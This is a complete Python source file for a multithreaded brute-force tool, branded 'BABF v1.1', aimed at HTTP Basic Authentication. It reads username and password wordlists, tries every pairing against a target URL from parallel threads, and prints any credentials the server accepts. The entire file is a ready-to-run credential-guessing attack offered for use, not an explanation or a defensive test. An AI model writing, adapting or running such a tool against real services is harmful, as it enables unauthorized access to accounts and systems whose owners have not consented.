import threading
import requests
import base64
import queue
import time
import argparse
from concurrent.futures import ThreadPoolExecutor

print_lock = threading.Lock()
counter_lock = threading.Lock()
request_counter = 0


def load_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        with print_lock:
            print(f"[-] File {file_path} not found")
        return []


def try_auth(username, password, target_url, total_requests):
    global request_counter
    
    auth_string = f"{username}:{password}"
    auth_header = {
        "Authorization": f"Basic {base64.b64encode(auth_string.encode()).decode()}"
    }
    with counter_lock:
        request_counter += 1
        current_request = request_counter
    
    try:
        response = requests.get(target_url, headers=auth_header, timeout=5)

        with print_lock:
            status = f"[{current_request}/{total_requests}]"
            if response.status_code == 200:
                print(f"\n{status} SUCCESS! Found credentials: {username}:{password}     ")
                return True
            elif response.status_code == 401:
                print(f"{status} Failed: {username}:{password}                 ", end='\r')
            else:
                print(f"{status} Unexpected status code {response.status_code} for: {username}:{password}")
                
    except requests.RequestException as e:
        with print_lock:
            print(f"{status} Error with {username}:{password}: {str(e)}")
    
    return False


def worker(credential_queue, found_flag, target_url, total_requests):
    while not credential_queue.empty() and not found_flag.is_set():
        try:
            username, password = credential_queue.get_nowait()
        except queue.Empty:
            break
            
        if try_auth(username, password, target_url, total_requests):
            found_flag.set()
        
        credential_queue.task_done()


def print_banner():
    banner = """
    ╔═══════════════════════════════╗
    ║          BABF v1.1            ║
    ║  Basic Auth Brute Force Tool  ║
    ║  Created by: @leddcode        ║
    ╚═══════════════════════════════╝
    """
    with print_lock:
        print(banner)


def attack():
    parser = argparse.ArgumentParser(description='Basic Auth Brute Force Tool')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads (default: 5)')
    parser.add_argument('-U', '--usernames', required=True, help='Path to usernames file')
    parser.add_argument('-P', '--passwords', required=True, help='Path to passwords file')
    args = parser.parse_args()

    print_banner()

    usernames = load_file(args.usernames)
    passwords = load_file(args.passwords)
    
    if not usernames or not passwords:
        return

    credentials = [(u, p) for p in passwords for u in usernames]
    total_requests = len(credentials)
    
    with print_lock:
        print(f"[*] Starting brute force attack")
        print(f"[*] Target: {args.url}")
        print(f"[*] Threads: {args.threads}")
        print(f"[*] Username count: {len(usernames)}")
        print(f"[*] Password count: {len(passwords)}")
        print(f"[*] Total attempts: {total_requests}\n")
    
    credential_queue = queue.Queue()
    for cred in credentials:
        credential_queue.put(cred)
    
    found_flag = threading.Event()
    
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for _ in range(args.threads):
            executor.submit(worker, credential_queue, found_flag, args.url, total_requests)
    
    credential_queue.join()
    
    end_time = time.time()
    execution_time = end_time - start_time
    
    with print_lock:
        if found_flag.is_set():
            print(f"\n[*] Attack completed successfully in {execution_time:.2f} seconds")
        else:
            print(f"\n[-] Credentials not found in {execution_time:.2f} seconds")


if __name__ == "__main__":
    attack()